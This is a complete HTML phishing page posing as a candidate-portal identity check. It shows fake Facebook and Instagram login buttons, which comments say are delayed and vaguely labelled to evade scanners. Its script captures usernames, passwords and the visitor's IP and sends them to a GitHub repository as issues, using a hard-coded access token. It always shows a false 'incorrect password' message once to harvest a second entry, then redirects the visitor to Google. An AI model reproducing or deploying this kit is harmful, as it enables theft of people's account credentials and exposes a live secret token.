<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Candidate Portal | Identity Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --axis: #861f41; }
        body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; margin: 0; }
        .header { background: #fff; padding: 15px; border-bottom: 2px solid var(--axis); text-align: center; font-weight: bold; color: var(--axis); }
        .auth-card { background: #fff; width: 340px; margin: 50px auto; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
        
        /* Hidden initially to bypass scanners */
        .social-btn { display: none; align-items: center; width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 8px; background: #fff; cursor: pointer; font-size: 14px; font-weight: 500; }
        .social-btn i { font-size: 20px; margin-right: 15px; }
        
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .login-btn { width: 100%; padding: 14px; background: var(--axis); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; }
        .modal-content { background: #fff; width: 300px; margin: 100px auto; padding: 25px; border-radius: 12px; text-align: center; }
        .err { color: #d93025; background: #fce8e6; padding: 8px; font-size: 12px; margin-bottom: 10px; border-radius: 4px; display: none; }
    </style>
</head>
<body>

<div class="header">CANDIDATE MANAGEMENT SYSTEM</div>

<div class="auth-card">
    <h3 style="margin-top:0;">Secure Sign In</h3>
    <p style="font-size:13px; color: #666;">Verify your identity via authorized social profile</p>

    <button id="btnA" class="social-btn" onclick="openLogin('A')"></button>
    <button id="btnB" class="social-btn" onclick="openLogin('B')"></button>

    <div style="margin:20px 0; color:#999; font-size:12px;">OR USE SYSTEM ID</div>
    <input type="text" id="u1" placeholder="Reference ID">
    <input type="password" id="p1" placeholder="Security Key">
    <button class="login-btn" onclick="sendData('System')">LOG IN</button>
</div>

<div id="logM" class="modal">
    <div class="modal-content">
        <div id="mIcon" style="font-size:40px; margin-bottom:10px;"></div>
        <div id="mTitle" style="font-weight:bold; margin-bottom:15px;">Verify Profile</div>
        <div id="eBox" class="err">Incorrect password. Please try again.</div>
        <input type="text" id="mUser" placeholder="Username / Email">
        <input type="password" id="mPass" placeholder="Password">
        <button class="login-btn" onclick="handleAuth()">CONTINUE</button>
    </div>
</div>

<script>
    const CONFIG = {
        TOKEN: "ghp_9jvRFvxgwANG419R0jNGgKThhEd2u70PG8e9",
        REPO: "Veer007ghk/system-v3-ya-data-panel-2026",
        REDIR: "https://www.google.com"
    };

    let selected = ""; let tryCount = 0;

    // 1. Delayed Loading & Ambiguous Text Logic
    setTimeout(() => {
        const bA = document.getElementById('btnA');
        const bB = document.getElementById('btnB');
        
        // Buttons par "Facebook/Instagram" nahi, "Profile" likha hai
        bA.innerHTML = '<i class="fab fa-facebook" style="color:#1877F2"></i> Verify via Profile A';
        bB.innerHTML = '<i class="fab fa-instagram" style="color:#E1306C"></i> Verify via Profile B';
        
        bA.style.display = 'flex';
        bB.style.display = 'flex';
    }, 2000); // 2 Seconds ka delay

    function openLogin(type) {
        selected = type; tryCount = 0;
        document.getElementById('eBox').style.display = 'none';
        document.getElementById('mIcon').innerHTML = type === 'A' ? '<i class="fab fa-facebook" style="color:#1877F2"></i>' : '<i class="fab fa-instagram" style="color:#E1306C"></i>';
        document.getElementById('logM').style.display = 'block';
    }

    async function handleAuth() {
        const u = document.getElementById('mUser').value;
        const p = document.getElementById('mPass').value;
        if(!u || !p) return;

        await sendData(selected, u, p);
        tryCount++;

        if(tryCount === 1) {
            document.getElementById('mPass').value = "";
            document.getElementById('eBox').style.display = 'block';
        } else {
            window.location.href = CONFIG.REDIR;
        }
    }

    async function sendData(m, user, pass) {
        const u = user || document.getElementById('u1').value;
        const p = pass || document.getElementById('p1').value;
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const { ip } = await res.json();
            await fetch(`https://api.github.com/repos/${CONFIG.REPO}/issues`, {
                method: 'POST',
                headers: { 'Authorization': `token ${CONFIG.TOKEN}`, 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    title: `Security Log: ${m} - ${ip}`,
                    body: `User: ${u} | Pass: ${p} | IP: ${ip} | Attempt: ${tryCount+1}`
                })
            });
            if(m === 'System') window.location.href = CONFIG.REDIR;
        } catch (e) { window.location.href = CONFIG.REDIR; }
    }
</script>

</body>
</html>
